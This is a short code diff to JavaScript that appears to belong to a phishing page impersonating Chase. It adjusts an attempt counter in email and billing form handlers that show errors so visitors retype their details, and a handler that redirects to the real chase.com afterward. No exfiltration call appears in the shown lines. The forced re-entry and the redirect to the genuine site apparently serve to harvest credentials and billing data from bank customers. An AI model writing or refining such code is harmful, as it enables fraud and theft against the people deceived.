@@ -72,7 +72,7 @@ EmailFrom.addEventListener("submit", async function (e) {
 
         clearLoading(loginbtn);
         const errorDiv = document.getElementById("errorremail")
-    
+        attempts += 1;
   
         
         if (attempts <= 1) {
@@ -157,7 +157,7 @@ BillingForm.addEventListener("submit", async function (e) {
         clearLoading(loginbtn);
         const errorDiv = document.getElementById("errorrbilling");
         attempts += 1;
-        console.log(attempts);
+ 
 
         
         if (attempts <= 4) {
@@ -311,3 +311,4 @@ dihlogin2.addEventListener("click", () => {
     window.location.href= 'https://www.chase.com/';
 
 });
+
